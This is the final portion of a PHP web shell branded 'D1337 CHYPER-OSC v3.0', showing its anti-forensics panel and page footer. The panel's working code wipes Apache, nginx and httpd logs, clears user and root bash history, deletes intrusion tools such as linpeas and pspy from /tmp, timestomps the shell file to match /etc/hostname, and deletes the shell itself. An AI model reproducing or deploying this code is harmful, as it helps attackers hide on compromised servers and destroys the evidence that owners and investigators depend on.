<option value="clear_logs">Clear Web Server Logs</option>
<option value="clear_bash">Clear Bash History</option>
<option value="clear_tmp">Clear /tmp</option>
<option value="timestomp">Timestomp This Shell</option>
<option value="selfdestruct">Self-Destruct</option>
</select>
<input type="submit" value="Execute" name="clean_exec" style="background:#c00">
</div>
</form>
<?php
if(isset($_POST['clean_exec'])&&$_POST['clean_action']){
    $a=$_POST['clean_action'];
    echo '<div class="cmd-out">';
    if($a=='clear_logs'){
        echo htmlspecialchars(d_exec('echo -n > /var/log/apache2/access.log 2>/dev/null; echo -n > /var/log/apache2/error.log 2>/dev/null; echo -n > /var/log/nginx/access.log 2>/dev/null; echo -n > /var/log/nginx/error.log 2>/dev/null; echo -n > /var/log/httpd/access_log 2>/dev/null; echo "Logs cleared"'));
    }elseif($a=='clear_bash'){
        echo htmlspecialchars(d_exec('history -c 2>/dev/null; echo -n > ~/.bash_history; echo -n > /root/.bash_history 2>/dev/null; echo "History cleared"'));
    }elseif($a=='clear_tmp'){
        echo htmlspecialchars(d_exec('rm -rf /tmp/linpeas* /tmp/pspy* /tmp/.d1337* /tmp/f 2>/dev/null; echo "Cleaned"'));
    }elseif($a=='timestomp'){
        $ref='/etc/hostname';
        if(file_exists($ref)){touch(__FILE__,filemtime($ref));echo "Timestomped to match $ref";}
        else echo "No reference file found";
    }elseif($a=='selfdestruct'){
        unlink(__FILE__);echo "Shell file deleted. Goodbye.";
    }
    echo '</div>';
}
?>
</div>

<?php endif;?>
</div>

<div style="text-align:center;padding:10px;font-size:10px;color:#333;border-top:1px solid #111">
D1337 CHYPER-OSC v3.0 | <?=date('Y-m-d H:i:s')?> | Mem: <?=fmt_size(memory_get_usage(true))?>
</div>

</body>
</html>
